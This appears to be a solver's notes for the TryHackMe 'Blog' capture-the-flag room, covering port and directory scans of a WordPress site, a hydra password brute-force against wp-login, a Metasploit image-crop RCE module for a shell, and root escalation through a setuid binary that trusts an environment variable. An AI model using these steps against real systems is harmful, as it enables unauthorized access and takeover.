# Link
- https://tryhackme.com/room/blog

# Info

## IP = ?

## Versions
- Wordpress: 5.0

## Creds
- ajax:
- bjoel:
- kwheel:cutiepie1

# Ports

## PortScanning
```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

## 22
```
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 578ada90baed3a470c05a3f7a80a8d78 (RSA)
|   256 c264efabb19a1c87587c4bd50f204626 (ECDSA)
|_  256 5af26292118ead8a9b23822dad53bc16 (ED25519)
```

## 80
```
80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Billy Joel&#039;s IT Blog &#8211; The IT blog
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-generator: WordPress 5.0
```

### _robots.txt_
- wp-admin
- wp-admin/admin-ajax

### `wpscan`


### `gobuster`

#### main page

```
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/0                    (Status: 301) [Size: 0] [--> http://$IP/0/]
/admin                (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
/atom                 (Status: 301) [Size: 0] [--> http://$IP/feed/atom/]
/dashboard            (Status: 302) [Size: 0] [--> http://blog.thm/wp-admin/]
/embed                (Status: 301) [Size: 0] [--> http://$IP/embed/]
/favicon.ico          (Status: 200) [Size: 0]
/feed                 (Status: 301) [Size: 0] [--> http://$IP/feed/]
/index.php            (Status: 301) [Size: 0] [--> http://$IP/]
/login                (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php]                                                                          
/page1                (Status: 301) [Size: 0] [--> http://$IP/]
/rdf                  (Status: 301) [Size: 0] [--> http://$IP/feed/rdf/]                                                                         
/robots.txt           (Status: 200) [Size: 67]
/rss                  (Status: 301) [Size: 0] [--> http://$IP/feed/]
/rss2                 (Status: 301) [Size: 0] [--> http://$IP/feed/]
/server-status        (Status: 403) [Size: 277]
/wp-admin             (Status: 301) [Size: 315] [--> http://$IP/wp-admin/]                                                                       
/wp-content           (Status: 301) [Size: 317] [--> http://$IP/wp-content/]                                                                     
/wp-includes          (Status: 301) [Size: 318] [--> http://$IP/wp-includes/]                                                                    
/xmlrpc.php           (Status: 405) [Size: 42]
```

#### /wp-admin
```
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/admin.php            (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php?redirect_to=http%3A%2F%2F$IP%2Fwp-admin%2Fadmin.php&reauth=1]    
/atom                 (Status: 301) [Size: 0] [--> http://$IP/wp-admin/feed/atom/]                                                               
/css                  (Status: 301) [Size: 319] [--> http://$IP/wp-admin/css/]                                                                   
/feed                 (Status: 301) [Size: 0] [--> http://$IP/wp-admin/feed/]                                                                    
/images               (Status: 301) [Size: 322] [--> http://$IP/wp-admin/images/]                                                                
/includes             (Status: 301) [Size: 324] [--> http://$IP/wp-admin/includes/]                                                              
/index.php            (Status: 302) [Size: 0] [--> http://blog.thm/wp-login.php?redirect_to=http%3A%2F%2F$IP%2Fwp-admin%2Findex.php&reauth=1]    
/js                   (Status: 301) [Size: 318] [--> http://$IP/wp-admin/js/]                                                                    cutiepie1
/maint                (Status: 301) [Size: 321] [--> http://$IP/wp-admin/maint/]                                                                 
/network              (Status: 301) [Size: 323] [--> http://$IP/wp-admin/network/]                                                               
/rdf                  (Status: 301) [Size: 0] [--> http://$IP/wp-admin/feed/rdf/]                                                                
/rss                  (Status: 301) [Size: 0] [--> http://$IP/wp-admin/feed/]                                                                    
/rss2                 (Status: 301) [Size: 0] [--> http://$IP/wp-admin/feed/]                                                                    
/user                 (Status: 301) [Size: 320] [--> http://$IP/wp-admin/user/]
```

#### /embed

#### brute-force in _kwheel_ username
```
hydra -l kwheel -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:is incorrect' -I

[80][http-post-form] host: $IP   login: kwheel   password: cutiepie1
```

### RevShell
- https://www.exploit-db.com/exploits/49512
- mom login doesn't have access to change themes...

### `msfconsole` for rev shell
- multi/http/wp_crop_rce
- it worked!

## Wordpress vuln
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress


## 139
```
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

## 445
```
445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
```

### `smbclient`
- share _BillySMB_
- not interesting files ...

# PrivEsc

## _linpeas.sh_ finds
```
define('DB_NAME', 'blog');
define('DB_USER', 'wordpressuser');
define('DB_PASSWORD', 'LittleYellowLamp90!@');
define('DB_HOST', 'localhost');
```

```
/usr/bin/gettext.sh
```

## _user.txt_ in _media/usb_
- flag{XXXX}

## /usr/sbin/checker 
- using `ltrace` binary
```
www-data@blog:/var/www/wordpress$ ltrace checker
ltrace checker
getenv("admin")                                  = nil
puts("Not an Admin"Not an Admin
)                             = 13
+++ exited (status 0) +++
www-data@blog:/var/www/wordpress$ export admin=www-data
export admin=www-data
www-data@blog:/var/www/wordpress$ ltrace checker
ltrace checker
getenv("admin")                                  = "www-data"
setuid(0)                                        = -1
system("/bin/bash"www-data@blog:/var/www/wordpress$ whoami
whoami
www-data
www-data@blog:/var/www/wordpress$ checker
checker
root@blog:/var/www/wordpress# whoami
whoami
root
```

# TODO
